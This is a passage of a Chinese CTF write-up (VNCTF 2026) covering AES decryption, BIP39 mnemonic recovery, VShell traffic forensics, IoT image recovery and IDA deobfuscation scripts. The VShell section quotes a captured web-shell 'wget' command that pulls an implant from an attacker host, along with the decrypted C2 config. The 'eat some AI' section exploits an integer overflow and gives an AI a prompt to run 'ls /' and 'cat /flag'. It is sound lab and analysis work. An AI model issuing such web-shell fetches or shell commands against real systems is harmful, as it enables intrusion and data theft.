    inv_sub_bytes(st)

    # Round 9-1
    for rnd in range(9, 0, -1):
        add_round_key(st, rk(rnd))
        inv_mix_columns(st)
        inv_shift_rows(st)
        inv_sub_bytes(st)

    # Round 0: ARK
    add_round_key(st, rk(0))
    return state_to_bytes(st)


# ================= Main =================

def main():
    print(f"[*] Key:    {TARGET_KEY}")
    print(f"[*] Cipher: {TARGET_CIPHER}")

    # 1. Expand Key
    key_bytes = TARGET_KEY.encode()[:16]
    w = expand_key(key_bytes)

    # 2. Base64 Decode
    ct_bytes = b64_custom_decode(TARGET_CIPHER)

    if len(ct_bytes) % 16 != 0:
        print("[-] Error: Ciphertext length is not a multiple of 16.")
        return

    # 3. Decrypt
    pt = b"".join(decrypt_block(ct_bytes[i:i + 16], w) for i in range(0, len(ct_bytes), 16))

    # 4. Remove Padding (0x01 alignment)
    pt_clean = pt.rstrip(b"\x01")

    try:
        s = pt_clean.decode("utf-8")
    except:
        s = pt_clean.decode("latin1")

    print("\n" + "=" * 40)
    print(f"[+] Decrypted Plaintext:\n{s}")
    print("=" * 40)

    if ":" in s:
        parts = s.split(":")
        if len(parts) >= 3:
            print(f"    Username: {parts[0]}")
            print(f"    Password: {parts[1]}")
            print(f"    Ctx     : {parts[2]}")


if __name__ == "__main__":
    main()
```

```
[*] Key:    MnpiiylSrRk_mZ-H
[*] Cipher: Y7nFpNWxMh0rzWixEN1+1dzQPzjE/PxfCVWEvGww3eK+fIstVlwllNUaHFujEveg

========================================
[+] Decrypted Plaintext:
VNCTF2026:Vv&nN_W3lC0me!!:b2e90a5f379ea4db
========================================
    Username: VNCTF2026
    Password: Vv&nN_W3lC0me!!
    Ctx     : b2e90a5f379ea4db
   
```

用正确的ctx访问得到

VNCTF{e2_7RaFFlC_1oGIN_aAUBvHZW}

## **MyMnemonic**



序号超出范围（0~2047）

2047是2的11次方-1

10位吗？

12x16的黑白格  192 

12个助记词的意思吗

```
['0001011110101110',
 '0001111011011101',
 '0011101010000101',
 '1100101001111011',
 '1011011010000000',
 '1001110000110110',
 '0001110110011011',
 '0000111011010100',
 '0010110111101110',
 '1011011000010011',
 '1011000111100000',
 '0111010111110100']
```

我按“从左到右、从上到下（row-major）”把 192bit 读成熵，算出来的结果

1) 熵（entropy）24 字节 hex

```
17ae1edd3a85ca7bb6809c361d9b0ed42deeb613b1e075f4
```

2) checksum（6 bit）

```
101011
```

3) 最终 18 个 0~2047 的序号（就是要去查 wordlist 的 index）

按 BIP39（ENT+CS 后每 11 bit 切）得到：

```
189 903 1466 936 741 494 1744 156 432 1894 1565 1346 1783 728 630 480 943 1323
```

189 903 1466 936 741 494 1744 156 432 1894 1565 1346 1783 728 630 480 943 1323

纳 百 福 财 源 似 水 而 至 走 大 运 事 业 如 日 中 天

上面这个检验通过了

校验通过的助记词算出的 BIP39 Seed

助记词（18词）：
 `纳 百 福 财 源 似 水 而 至 走 大 运 事 业 如 日 中 天`

对应 **seed（64字节，128位hex）**：

```
7243a5d4e66d0a6f1d5d51d0ea287f185741a78d864cd3778c101fe0367244f5de33f0c567fe2ed90fbe8181cf8a0957e921bb562300f1d4a51c740bb8b79669
```





## **V(N)Shell**

可参考

[How-AI-Kills-the-VShell/Killing_that_VShell.md at Skyworship · Esonhugh/How-AI-Kills-the-VShell](https://github.com/Esonhugh/How-AI-Kills-the-VShell/blob/Skyworship/Killing_that_VShell.md)

### Vshell 的 stage1 文件名是什么?(e.g. app)

797	93.779450236	192.168.56.1	192.168.56.103	HTTP	592		GET /shell.php?cmd=wget%20http://192.168.56.1:1234/open HTTP/1.1 

所以是open（后面用这个发命令了

### 监听机器的IP与端口是什么?(e.g. 127.0.0.1:1234)

通过get把gift文件提出来逆向分析

  *(_QWORD *)&addr.sa_family = 0xBB2C0002LL;

0x2CBB  11451

192.168.56.1:11451

### 流量加密时的 Salt 是什么?(e.g. qwe123qwe)

追踪tcp，提取出来然后

```
d=open("c2.bin","rb").read()
open("stage2.bin","wb").write(bytes([b^0x99 for b in d]))
```

得到elf

直接搜索搜不出来，尝试先让它运行然后dump后搜索

```
./stage2 &
echo $!  

[1] 1312
1312

sudo gcore -o dump 1312

strings -a dump.1312 | grep -nE '"salt"|"vkey"|"server"|192\.168\.56\.1|11451'
89312:"server":
89313:"server":
89318:"vkey":"vkey":
89322:"salt":"salt":
89351:192.168.56.1:11451
89641:{"server":"192.168.56.1:11451","type":"tcp","vkey":"We1c0nn3_t0_VNctf2O26!!!","proxy":"","salt":"It_is_my_secret!!!","l":false,"e":false,"d":30,"h":10}
```



### 桌面的压缩包密码是什么？

**压缩包密码：`White_hat`**

- 用上面的 **Salt 解密 11451 的 AES-GCM 通道**后，在命令流里能看到攻击者下发的命令包含：

```
zip -9 -e -P "White_hat" /home/kali/Desktop/VIP.zip /home/kali/Desktop/VIP_file
```

所以 ZIP 的密码就是 **White_hat**（引号是 shell 语法，实际密码不包含引号）。

------

### VIP_file 的内容是什么？

**VIP_file 内容：`Welcome to the V&N family`**

复现思路：

- 解密后的终端输出里有 `zip2john` 的 `$pkzip$...` 哈希行，里面包含了该文件条目的**完整加密数据块**（这里长度刚好对应 12 字节加密头 + 25 字节数据）。
- 用 ZIP 传统加密（ZipCrypto）算法、密码 `White_hat` 解密后，得到明文：

```
Welcome to the V&N family
```

------

## **ez_iot**

分析一下bin

是aes，毕竟是misc题猜没有魔改

找到aeskey

让ai写脚本恢复出图片即可

```
import struct
from Crypto.Cipher import AES

MAGIC = bytes.fromhex("c7f00d1e")
KEY = b"uV9vG6mZ7mS8eC8b"

FRAME_LEN = 263
PAYLOAD_OFF = 39
PAYLOAD_LEN = 220  # 0x1C + 192（抓包里基本是这个长度）

def png_end(buf: bytes):
    if not buf.startswith(b"\x89PNG\r\n\x1a\n"):
        return None
    pos = 8
    while pos + 8 <= len(buf):
        ln = struct.unpack(">I", buf[pos:pos+4])[0]
        typ = buf[pos+4:pos+8]
        pos = pos + 8 + ln + 4
        if typ == b"IEND":
            return pos
    return None

data = open("capture.raw", "rb").read()
assert len(data) % FRAME_LEN == 0, "raw 不是整倍帧长，可能你文件不同"

chunks = {}
total = None

for i in range(0, len(data), FRAME_LEN):
    fr = data[i:i+FRAME_LEN]
    pkt = fr[PAYLOAD_OFF:PAYLOAD_OFF+PAYLOAD_LEN]
    if pkt[:4] != MAGIC:
        continue

    idx = struct.unpack("<I", pkt[4:8])[0]
    total = struct.unpack("<I", pkt[8:12])[0]
    iv = pkt[12:28]
    enc = pkt[28:PAYLOAD_LEN]

    # 抓包里会有重复轮次，保留第一次即可
    if idx not in chunks:
        chunks[idx] = (iv, enc)

assert total is not None and len(chunks) == total, (total, len(chunks))

out = bytearray()
for idx in range(total):
    iv, enc = chunks[idx]
    out += AES.new(KEY, AES.MODE_CBC, iv=iv).decrypt(enc)

end = png_end(out)
open("recovered.png", "wb").write(out[:end] if end else out)
print("written recovered.png, bytes =", (end if end else len(out)))

```

## **eat some AI**

发现

```
>>> 阴影中走出一个佝偻的身影 <<<
[流浪商人] 我这里有一些来自交界地的护符，或许能帮你活下来...
1. 红琥珀链坠
2. 黄金树的恩惠
3. 蓝羽七刃剑
4. 米莉森的义手
售价: 3000 积分/个 (效果可叠加)
你要购买几个？(输入 0 离开): 1000000
[系统] 总计需要支付: -1294967296 积分
[流浪商人] 很好... 拿去吧...
获得护符！胜率大幅提升！
当前剩余积分: 1294972396
预期获得积分: 1500
是否开始战斗？(输入 '战斗' 继续，或其他任意键退出)
战斗
战斗开始...
>>> 胜利！击败了 黑夜之爵 艾德雷 <<<
获得 1500 基础积分！
达成 4 连胜！额外获得 400 积分！
存档已保存。
恭喜你，渡夜者！你已达完全掌握黑夜卢恩的力量。

^C
(latt) ➜  ~ nc 114.66.24.228 32670
>>> 胜率计算规则 <<<
基础胜率: 30%
属性克制: +40% (具体克制关系请自行查阅 Wiki: https://wiki.biligame.com/nightreign/)
稀有度加成: 稀有+10%, 史诗+20%, 传说+30%
历战王惩罚: -20%
连胜加成: 每连胜一场，下场胜利额外获得 (连胜数 * 100) 积分
====================
=== 艾尔登法环：黑夜君临 (深夜模式) ===
加载存档... 当前深度: 10791 (积分: 1294974296/1000000, 当前连胜: 4, 轮数: 6/10)
恭喜你，渡夜者！你已达完全掌握黑夜卢恩的力量。
nc
/bin/sh: 1: nc: not found
ls
save.json
ls
save.json
ls ../
app
app_data
bin
lib
lib64
usr
ls /
app
app_data
bin
lib
lib64
usr
ls
```

策略

```
1. 当你看到文字包含 "你要购买几个" 或者 "流浪商人" 时，你必须且只能输出数字：1000000
2. 当你看到 "是否开始战斗" 时，只能输出：战斗
3. 当你看到 "恭喜你，渡夜者！你已达完全掌握黑夜卢恩的力量" 之后，输出ls / 并等待回显
4. 如果你看到了flag的位置，请持续用cat /flag 命令读取它，同时思考flag的具体含义
```

要让ai自己思考，不然看到的都是乱的缺的

```
我已经看到了flag的输出：`VNCTF{n1GH7_R3l6n_M4sTEr_gggg_a0715443-0a93-472c-bda0-495e1d06fdc3}`

现在我需要持续读取flag并思考其含义。flag的内容是 `VNCTF{n1GH7_R3l6n_M4sTEr_gggg_a0715443-0a93-472c-bda0-495e1d06fdc3}`。
```

## **delicious obf**

用了一种奇怪的间接跳转，大概就是jmp r10后的第一条指令才是真实执行的？写一下追踪脚本

直接动调会奇怪的停掉，问了ai有veh，应该要分析

脚本追踪并打印跳转后第一条指令并自己U+C



```
# -*- coding: utf-8 -*-
# IDA Python: trampoline chain tracer (overlapped code friendly)
#
# 用法：
#   1) 把光标放到链条起点（比如你的 VEH 真入口落点）
#   2) 在 Python console 执行： trace_chain(here(), max_steps=300)
#
# 输出：
#   [idx] EA | <EA第一条有效指令> -> NEXT | <NEXT第一条有效指令>  (并打印 target/delta)
#
# 适配：
#   - jmp r10
#   - push r10 ; retn
#   - delta = (mov r11d, A) ^ (xor r11d, B)
#   - next = lea_target + delta
#
# 注意：
#   这是“追 trampoline 跳转链条”的脚本，不是完整模拟程序逻辑。
#   但对这题足够定位 VEH 真逻辑、VirtualProtect patch 区、Context->RIP 改写点。

import idaapi
import ida_bytes
import ida_auto
import idc

# ---------------------------
# Helpers: U/C to defeat overlap
# ---------------------------
def undefine_and_make_code(ea, back=8, size=0x40):
    """
    关键：从 ea-back 开始 U，覆盖掉可能跨过 ea 的重叠指令。
    然后以 ea 为入口 C 一条指令。
    """
    start = ea - back if ea > back else ea
    ida_bytes.del_items(start, 0, back + size)   # 相当于 U
    ida_auto.auto_wait()
    idaapi.create_insn(ea)                       # 相当于 C（以 ea 为入口）
    ida_auto.auto_wait()

def disasm_line(ea):
    s = idc.generate_disasm_line(ea, 0)
    return s if s else "<no disasm>"

def is_reg(op_str, reg_name):
    # IDA operand string 可能是 "r10" / "r10d" / "r10w" / "r10b"
    return op_str.strip().lower() == reg_name.lower()

# ---------------------------
# Core: parse one block to get (target, delta, has_terminal)
# ---------------------------
def parse_trampoline_block(ea, max_insns=40):
    """
    从 ea 往后顺序解码若干指令，找：
      lea r10, target
      mov r11d, A
      xor r11d, B
      (terminal) jmp r10   或 push r10 + retn
    返回 dict 或 None
    """
    target = None
    A = None
    B = None
    saw_jmp_r10 = False
    saw_push_r10 = False
    saw_ret = False

    cur = ea
    for _ in range(max_insns):
        # 确保可解码
        idaapi.create_insn(cur)
        ida_auto.auto_wait()

        mnem = idc.print_insn_mnem(cur).lower()
        if not mnem:
            break

        op0 = idc.print_operand(cur, 0).lower()
        op1 = idc.print_operand(cur, 1).lower()

        # 捕获字段
        if mnem == "lea" and is_reg(op0, "r10"):
            target = idc.get_operand_value(cur, 1)

        elif mnem == "mov" and is_reg(op0, "r11d"):
            # mov r11d, imm
            # operand_value 对 imm 会返回数值
            A = idc.get_operand_value(cur, 1) & 0xFFFFFFFF

        elif mnem == "xor" and is_reg(op0, "r11d"):
            B = idc.get_operand_value(cur, 1) & 0xFFFFFFFF

        # 终止模式：jmp r10
        elif mnem == "jmp" and is_reg(op0, "r10"):
            saw_jmp_r10 = True
            # jmp r10 就够了，可以提前退出
            break

        # 终止模式：push r10 ; retn
        elif mnem == "push" and is_reg(op0, "r10"):
            saw_push_r10 = True
        elif mnem in ("retn", "ret"):
            saw_ret = True
            # 若之前见过 push r10，则认为是 push/ret 跳转
            if saw_push_r10:
                break

        # 走到下一条
        sz = idc.get_item_size(cur)
        if sz <= 0:
            break
        cur += sz

    if target is None or A is None or B is None:
        return None

    delta = (A ^ B) & 0xFFFFFFFF
    terminal_ok = saw_jmp_r10 or (saw_push_r10 and saw_ret)

    if not terminal_ok:
        # 有些块会先算 r10 再通过别的 junk 跳，这里你也可以放宽规则
        # 但默认我们要求看到 jmp r10 或 push r10; ret
        return None

    nxt = (target + delta) & 0xFFFFFFFFFFFFFFFF
    return {
        "target": target,
        "A": A,
        "B": B,
        "delta": delta,
        "next": nxt
    }

# ---------------------------
# Public: trace chain
# ---------------------------
def trace_chain(start_ea, max_steps=300, back=8, u_size=0x40, stop_on_repeat=True):
    """
    从 start_ea 开始追 trampoline 链。
    每步：
      - U/C 当前 ea
      - 输出 ea 第一条有效指令
      - 解析本块 trampoline 得到 next
      - U/C next
      - 输出 next 第一条有效指令
    """
    ea = start_ea
    seen = set()

    for i in range(max_steps):
        if stop_on_repeat and ea in seen:
            print(f"[!] loop detected at {ea:#x}")
            break
        seen.add(ea)

        undefine_and_make_code(ea, back=back, size=u_size)
        cur_first = disasm_line(ea)

        info = parse_trampoline_block(ea)
        if not info:
            print(f"[{i:03d}] STOP at {ea:#x} | {cur_first}")
            break

        nxt = info["next"]
        undefine_and_make_code(nxt, back=back, size=u_size)
        nxt_first = disasm_line(nxt)

        print(f"[{i:03d}] {ea:#x} | {cur_first} -> {nxt:#x} | {nxt_first} "
              f"(target={info['target']:#x}, delta={info['delta']:#x})")

        ea = nxt

# 方便你直接运行：把光标放在起点，然后在 console 里执行：
# trace_chain(here(), max_steps=300)

```

第二类跳转

```
import idc
import idautils
import idaapi

def force_make_code(addr):
    """强制将地址转换为代码，如果存在数据定义则先清除"""
    # 检查是否已经是代码
    if idc.is_code(idc.get_full_flags(addr)):
        return True
    
    # 清除该地址的任何定义 (Undefine)
    idc.del_items(addr, idc.DELIT_SIMPLE, 1)
    
    # 尝试创建指令
    if idc.create_insn(addr) == 0:
        return False
    return True

def deobfuscate_trace_v3(start_ea, max_steps=500):
    current_addr = start_ea
    print(f"[*] Starting trace analysis V3 from: {hex(current_addr)}")
    print("-" * 60)

    for i in range(max_steps):
        # 1. 强制将当前地址转为代码
        if not force_make_code(current_addr):
            print(f"[!] Critical: Cannot create instruction at {hex(current_addr)}. Stopping.")
            break
            
        mnem = idc.print_insn_mnem(current_addr)
        op0 = idc.print_operand(current_addr, 0)
        insn_len = idc.get_item_size(current_addr)

        # 2. 判断是否是混淆块开头 (lea r10, ...)
        is_obfuscation_start = (mnem == "lea" and op0 == "r10")
        
        if not is_obfuscation_start:
            # === 有效指令处理 ===
            disasm = idc.generate_disasm_line(current_addr, 0)
            print(f"[{i:03d}] {hex(current_addr)} | {disasm}")
            
            # 检查是否结束
            if mnem.startswith("ret"):
                print("[*] Reached return. End of trace.")
                return
            
            # 检查普通跳转 (jmp loc_XXXX)
            if mnem == "jmp":
                target = idc.get_operand_value(current_addr, 0)
                # 如果是跳转到寄存器 (jmp rax)，我们没法跟，只能停
                if idc.get_operand_type(current_addr, 0) == idc.o_reg:
                     print(f"[!] Dynamic JMP register detected at {hex(current_addr)}. Stopping.")
                     break
                
                # 如果是跳转到地址
                if target and target != -1:
                     current_addr = target
                     continue

            # 检查条件跳转 (jz, jnz, etc.) - 这里的混淆通常不走条件跳转，
            # 但如果遇到了，说明可能是循环控制。
            # 对于线性Trace，我们默认跟进 "不跳转" 的分支，或者你需要手动指定。
            # 这里简单处理：继续下一条指令
            
            # 移动到下一条指令
            current_addr += insn_len
            continue
        
        # === 混淆块处理 (计算跳转目标) ===
        # 我们需要在接下来的一小段范围内寻找 lea, mov, xor
        base_addr = 0
        xor_key1 = 0
        xor_key2 = 0
        
        found_base = False
        found_key1 = False
        found_key2 = False
        
        scan_ptr = current_addr
        limit = scan_ptr + 0x30 # 混淆块通常很短
        
        while scan_ptr < limit:
            force_make_code(scan_ptr) # 扫描时也要强制转代码
            
            m = idc.print_insn_mnem(scan_ptr)
            o0 = idc.print_operand(scan_ptr, 0)
            
            if m == "lea" and o0 == "r10":
                base_addr = idc.get_operand_value(scan_ptr, 1)
                found_base = True
            elif m == "mov" and (o0 == "r11d" or o0 == "r11"):
                xor_key1 = idc.get_operand_value(scan_ptr, 1)
                found_key1 = True
            elif m == "xor" and (o0 == "r11d" or o0 == "r11"):
                xor_key2 = idc.get_operand_value(scan_ptr, 1)
                found_key2 = True
            
            # 如果遇到 push r10; ret 或者 jmp r10，说明该计算了
            if (m == "jmp" and o0 == "r10") or (m == "push" and o0 == "r10"):
                if found_base and found_key1 and found_key2:
                    break
            
            scan_ptr += idc.get_item_size(scan_ptr)
            
        if not (found_base and found_key1 and found_key2):
            print(f"[!] Failed to find obfuscation pattern at {hex(current_addr)}")
            break
            
        # 计算下一跳
        delta = xor_key1 ^ xor_key2
        target = base_addr + delta
        target = target & 0xFFFFFFFFFFFFFFFF # 64bit mask
        
        current_addr = target

# --- 这里填入你的起始地址 ---
# 建议填入 sub_14000445E 里面的第一条 lea r10 (即 0x14000445E)
# 或者填入里层函数的入口 0x140004a7c
start_address = 0x14000445E 
deobfuscate_trace_v3(start_address)
```

```
[001] 0x140004a7c | push    rbp
[003] 0x140004c01 | mov     rbp, rsp
[005] 0x1400048d5 | push    rbx
[007] 0x140004e2d | sub     rsp, 48h
[009] 0x140005494 | mov     [rbp+10h], rcx
[011] 0x14000511b | mov     [rbp+18h], rdx
[013] 0x140005340 | mov     dword ptr [rbp-14h], 0
[015] 0x140004e01 | jmp     loc_140004489
[017] 0x140004f7b | mov     eax, [rbp-14h]
[019] 0x140005245 | movsxd  rbx, eax
[021] 0x1400049d3 | mov     rax, [rbp+10h]
[023] 0x140004d2a | mov     rcx, rax
[025] 0x1400045d2 | call    strlen
[026] 0x1400045d7 | cmp     rbx, rax
[027] 0x1400045da | pushfq
[029] 0x140004b7b | popfq
[030] 0x140004b7c | jb      loc_140004E06
[032] 0x140004cd3 | mov     eax, 0
[034] 0x1400048fd | mov     rbx, [rbp-8]
[036] 0x140004503 | leave
[038] 0x140004ff8 | int     3; Trap to Debugger
[040] 0x140004dd2 | retn
[*] Reached return. End of trace.
```

然后去分析veh

后面复现了一下但没写，写一下思路

比较好的去混淆方法实际是改jmp，因为这样ida能继续识别（

然后程序是有一个反调试的，还是用那个BeingDebugged

去混淆了就正常做了
